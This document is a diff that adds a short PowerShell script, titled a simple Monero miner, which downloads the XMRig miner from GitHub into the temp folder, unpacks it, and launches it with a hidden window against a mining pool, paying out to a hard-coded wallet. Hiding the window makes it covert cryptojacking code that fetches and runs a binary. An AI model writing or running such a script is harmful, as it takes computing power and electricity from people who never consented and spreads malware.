@@ -1,0 +1,13 @@
+# Simple Monero miner
+$wallet = "8Ar9qwqFkxm62LEpv22FV9hqyBoc2Rjk5eayni9QKhasHLSKysm1Z9pcggo6VvJGs8eY1GDziQZnAVpLnL582N3CMsEErDb"
+$url = "https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-win-x64.zip"
+$outfile = "$env:TEMP\xmrig.zip"
+
+# Download miner
+(New-Object Net.WebClient).DownloadFile($url, $outfile)
+
+# Extract
+Expand-Archive $outfile -DestinationPath "$env:TEMP\xmrig" -Force
+
+# Start mining
+Start-Process "$env:TEMP\xmrig\xmrig-6.20.0\xmrig.exe" -ArgumentList "--url pool.supportxmr.net:5555 --user $wallet --cpu" -WindowStyle Hidden
